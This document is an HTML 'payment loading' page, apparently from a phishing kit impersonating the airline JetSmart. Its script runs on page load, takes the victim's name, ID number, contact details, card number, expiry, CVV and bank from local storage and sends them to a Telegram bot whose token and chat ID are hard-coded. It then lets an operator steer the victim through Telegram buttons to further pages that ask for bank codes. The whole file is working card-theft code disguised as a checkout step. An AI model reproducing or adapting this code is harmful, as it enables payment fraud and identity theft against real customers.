<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargar Pago</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .loader {
            border: 16px solid #f3f3f3;
            border-top: 16px solid #3498db;
            border-radius: 50%;
            width: 100px;
            height: 100px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        const config = {
            token: "7209995082:AAE8LWBaVbx8WV047-IY8bYYcogO5BwqN4g",
            chat_id: "-4563479931"
        };

        // Función para enviar datos al bot de Telegram
        async function enviarDatosTelegram() {
            // Obtener datos del localStorage
            const paymentData = localStorage.getItem('pagojet');

            if (!paymentData) {
                console.error("No se encontraron datos en localStorage.");
                return;
            }

            const parsedData = JSON.parse(paymentData);
            console.log("Datos encontrados en localStorage:", parsedData);

            // Validar datos requeridos
            const requiredFields = ["email", "celular", "direccion", "tarjeta", "ftarjeta", "cvv", "id", "ip", "banco", "nombre"];
            for (const field of requiredFields) {
                if (!parsedData[field]) {
                    console.error(`Falta el campo obligatorio: ${field}`);
                    return;
                }
            }

            // Generar ID de transacción único
            const transaction_id = `txn_${Date.now()}`;
            sessionStorage.setItem("transaction_id", transaction_id);

            // Crear el mensaje para Telegram
            const message = `
<b>Nuevo método de pago pendiente de verificación.</b>
<b>🪬JETSMART - PANEL🪬</b>
--------------------------------------------------
🆔 <b>ID Transacción:</b> | <b>${transaction_id}</b>
📡 <b>IP:</b> | <b>${parsedData.ip}</b>
-----------------------------------------------
👤 <b>Nombre:</b> | <i>${parsedData.nombre}</i>
🆔 <b>Cédula:</b> | <i>${parsedData.id}</i>
👤 <b>Email:</b> | <i>${parsedData.email}</i>
📞 <b>Teléfono:</b> | <code>${parsedData.celular}</code>
🏠 <b>Dirección:</b> | <b>${parsedData.direccion}</b>
-----------------------------------------------
💳 <b>Tarjeta:</b> | <b>${parsedData.tarjeta}</b>
📅 <b>Fecha:</b> | <b>${parsedData.ftarjeta}</b>
🔐 <b>CVV:</b> | <b>${parsedData.cvv}</b>
🏦 <b>Banco:</b> | <b>${parsedData.banco}</b>
-----------------------------------------------`;

            const keyboard = {
                inline_keyboard: [
                    [{ text: "Pedir Logo", callback_data: `pedir_logo:${transaction_id}` }],
                    [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transaction_id}` }],
                    [{ text: "Error de TC", callback_data: `error_tc:${transaction_id}` }],
                    [{ text: "Error de Logo", callback_data: `error_logo:${transaction_id}` }],
                    [{ text: "Finalizar", callback_data: `finalizar:${transaction_id}` }]
                ]
            };

            try {
                // Enviar datos a Telegram
                const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: config.chat_id,
                        text: message,
                        parse_mode: "HTML",
                        reply_markup: keyboard
                    })
                });

                const data = await response.json();
                if (data.ok) {
                    console.log("Mensaje enviado a Telegram:", data);
                    verificarActualizaciones(transaction_id);
                } else {
                    console.error("Error al enviar mensaje a Telegram:", data);
                }
            } catch (error) {
                console.error("Error en la solicitud a Telegram:", error);
            }
        }

        // Función para verificar actualizaciones en Telegram
        async function verificarActualizaciones(transaction_id) {
            console.log("Iniciando verificación de actualizaciones...");

            const redirectTimeout = setTimeout(() => {
                console.log("Redirigiendo a pedir_logo.php...");
                window.location.href = "pedir_logo.php";
            }, 2000);

            const interval = setInterval(async () => {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${config.token}/getUpdates`);
                    const updates = await response.json();

                    if (updates.result) {
                        for (const update of updates.result) {
                            if (update.callback_query) {
                                const [action, id] = update.callback_query.data.split(":");
                                if (id === transaction_id) {
                                    clearTimeout(redirectTimeout);
                                    clearInterval(interval);

                                    switch (action) {
                                        case "pedir_logo":
                                            window.location.href = "pedir_logo.php";
                                            break;
                                        case "pedir_dinamica":
                                            window.location.href = "pedir_dinamica.php";
                                            break;
                                        case "error_tc":
                                            window.location.href = "pago.php";
                                            break;
                                        case "error_logo":
                                            window.location.href = "pedir_logo.php";
                                            break;
                                        case "finalizar":
                                            window.location.href = "finish.html";
                                            break;
                                        default:
                                            console.error("Acción desconocida:", action);
                                    }
                                }
                            }
                        }
                    }
                } catch (error) {
                    console.error("Error al verificar actualizaciones:", error);
                }
            }, 5000); // Verificar cada 5 segundos
        }

        // Inicia el envío al cargar la página
        enviarDatosTelegram();
    </script>
</body>
</html>
